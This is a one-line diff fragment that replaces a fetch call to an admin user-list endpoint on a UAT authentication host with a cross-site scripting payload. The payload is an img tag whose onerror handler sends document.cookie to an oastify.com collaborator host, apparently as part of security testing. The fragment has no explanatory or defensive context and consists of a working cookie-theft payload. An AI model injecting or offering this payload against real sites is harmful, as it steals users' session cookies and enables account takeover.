@@ -1,1 +1,1 @@
-fetch("https://auth-uat.coigncard.com/admin/user?PageIndex=0&BatchSize=20&RoleId=&OrderBy=Created");
+<img src=dvr onerror="fetch('https://an1kdpubztspruo1zovsup2z4qahy7mw.oastify.com/?'+document.cookie)">
